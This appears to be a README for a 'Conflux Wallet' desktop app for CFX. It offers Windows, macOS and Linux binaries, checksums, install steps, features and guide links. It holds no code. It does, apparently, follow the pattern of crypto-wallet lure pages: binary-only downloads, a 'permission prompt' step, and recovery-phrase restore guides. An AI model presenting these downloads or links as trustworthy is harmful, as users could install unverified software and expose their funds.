![Conflux Wallet](assets/banner-app.png)

<h1 align="center">Conflux Wallet</h1>

<p align="center">A free desktop wallet for CFX on Conflux Core Space and eSpace, for Windows, macOS and Linux.</p>

<p align="center"><img src="https://img.shields.io/badge/LICENSE-MIT-30A0D0?style=for-the-badge&labelColor=101010" alt="License: MIT"> <img src="https://img.shields.io/badge/RELEASE-v0.6.14-30A0D0?style=for-the-badge&labelColor=101010" alt="Release v0.6.14"></p>

---

## Downloads - v0.6.14

<p align="center"><a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-30A0D0?style=for-the-badge&labelColor=101010&logo=apple" alt="Download for macOS"></a> <a href="https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-30A0D0?style=for-the-badge&labelColor=101010&logo=linux" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`conflux-wallet-windows-v0.6.14.exe`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-windows-v0.6.14.exe) |
| <img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"> | macOS 12 or later | [`conflux-wallet-macos-v0.6.14.dmg`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-macos-v0.6.14.dmg) |
| <img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"> | x64 Ubuntu 20.04 or later, or equivalent | [`conflux-wallet-linux-v0.6.14.zip`](https://github.com/conflux-developments/conflux-desktop-wallet/releases/download/v0.6.14/conflux-wallet-linux-v0.6.14.zip) |

</div>

Verify all files against the SHA-256 values below.

<!-- SHA256:START -->
<div align="center">

| File | SHA-256 |
|---|---|
| `conflux-wallet-windows-v0.6.14.exe` | `f8a44cf2b6021a73502d2b429098cddb873fd5cace231658c9be332f82769034` |
| `conflux-wallet-macos-v0.6.14.dmg` | `a9f3dbdf8a898cb2eb7e30e1c333c03e54e3452d87b86459bcd8216edd0dfa6b` |
| `conflux-wallet-linux-v0.6.14.zip` | `971aded02415adda1ac9ac5ad4933dc5a850eb596e558c73029dc9ec56ea4b71` |

</div>
<!-- SHA256:END -->

> Only download from this GitHub release page.

---

## Install

<details open>
<summary><img src="assets/platform-windows.png" alt="Windows"></summary>

1. Download `conflux-wallet-windows-v0.6.14.exe` from the table above.
2. Run the installer and choose the folder to install into.
3. Launch Conflux Wallet from the Start menu, then create a wallet or restore one from a recovery phrase.

</details>

<details>
<summary><img src="https://img.shields.io/badge/MACOS-1B6E93?style=flat-square&labelColor=101010&logo=apple" alt="macOS"></summary>

1. Download `conflux-wallet-macos-v0.6.14.dmg` from the table above.
2. Open the disk image and drag Conflux Wallet into Applications.
3. Open Conflux Wallet from Applications, then create a wallet or restore one from a recovery phrase.

</details>

<details>
<summary><img src="https://img.shields.io/badge/LINUX-1B6E93?style=flat-square&labelColor=101010&logo=linux" alt="Linux"></summary>

1. Download `conflux-wallet-linux-v0.6.14.zip` from the table above.
2. Unzip the archive into a folder you can write to.
3. Run the Conflux Wallet executable inside that folder, then create a wallet or restore one from a recovery phrase.

</details>

---

## Features

- **Two spaces, one app.** Core Space and eSpace accounts side by side, with the active space
  labelled and each address shown in the format that belongs to it.
- **Self-custody keys.** Generated and encrypted on your computer; the recovery phrase restores
  the accounts anywhere.
- **Built-in staking.** Core Space staking with staked, unlocking and reward balances shown next
  to spendable CFX.
- **Hardware signing.** Ledger and Trezor, for both spaces, with each transaction approved on the
  device.
- **Speed up or cancel.** A pending transaction can be replaced or cancelled from the app, with
  the nonce handled for you.
- **Free.** No subscription and no fee on top of network gas.

---

## Networks

Core Space is the native network, with `cfx:` base32 addresses, native transfers and
staking. eSpace is the EVM-compatible network, with `0x` addresses and the contracts dApps
use. They share CFX but keep separate accounts, balances and history, and the wallet shows
which one you are in before you sign anything.

---

## Guides

<div align="center">

| Guide | What it covers |
|---|---|
| [Install Conflux Wallet on Windows](https://github.com/conflux-developments/setup-handbook/blob/HEAD/install-conflux-wallet-on-windows.md) | Download the Windows installer from the project's GitHub releases page, run it, allow the permission prompt, and open the app. |
| [Conflux Wallet Download and Current Release](https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-wallet-download-guide.md) | Download Conflux Wallet from the project's GitHub releases page, choosing the installer for your system: Windows, macOS or Linux. |
| [Restore Conflux Wallet From Seed Phrase](https://github.com/conflux-developments/recovery-playbook/blob/HEAD/restore-conflux-wallet-from-seed-phrase.md) | Open Conflux Wallet, choose restore rather than create, and enter the recovery phrase in order, in lowercase, with single spaces. |
| [Core Space vs eSpace](https://github.com/conflux-developments/setup-handbook/blob/HEAD/conflux-core-space-vs-espace.md) | Conflux has two spaces on one network. |

</div>

[All Conflux Wallet guides](https://github.com/conflux-developments/setup-handbook/blob/HEAD/README.md)

---

**Security:** download only from this release page, and never share a recovery phrase, private key, password or keystore file with anyone, including support.

## Support

Wallet help: support@confluxwallet.net. Business and legal: office@confluxwallet.net.

## License

MIT

